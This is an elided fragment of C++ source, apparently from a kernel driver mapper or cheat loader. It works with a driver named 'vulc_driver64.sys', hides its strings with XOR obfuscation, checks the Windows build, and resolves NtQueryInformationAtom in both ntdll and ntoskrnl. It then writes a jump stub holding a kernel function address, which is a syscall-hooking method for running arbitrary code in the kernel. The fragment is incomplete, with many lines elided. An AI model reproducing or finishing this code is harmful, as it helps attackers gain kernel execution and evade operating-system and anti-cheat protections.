...
{
	constexpr auto driver_name = "vulc_driver64.sys";
...
#pragma warning(disable : 4996)
		...
		const auto system_name = XorWideString(L"kernel32.dll");
		DWORD dummy;
		const auto cbInfo =
		...
		void* p = nullptr;
		UINT size = 0;
		::VerQueryValueW(buffer.data(), XorWideString(L"\\"), &p, &size);
		...
		if (HIWORD(pFixed->dwFileVersionLS) >= 19041) {
			const auto NtQueryInformationAtom = reinterpret_cast<void*>(GetProcAddress(LoadLibrary(XorString("ntdll.dll")), XorString("NtQueryInformationAtom")));
			...
			*(uint64_t*)((&kernel_injected_jmp[0]) + 2) = kernel_function_address;
			...
			const uint64_t kernel_NtQueryInformationAtom = GetKernelModuleExport(device_handle, utilitiesy::GetKernelModuleAddress(XorString("ntoskrnl.exe")), XorString("NtQueryInformationAtom"));
			...
			else
			{
				...
				std::memcpy(kernel_function_jmp + 2, &kernel_function_address, sizeof(kernel_function_address));
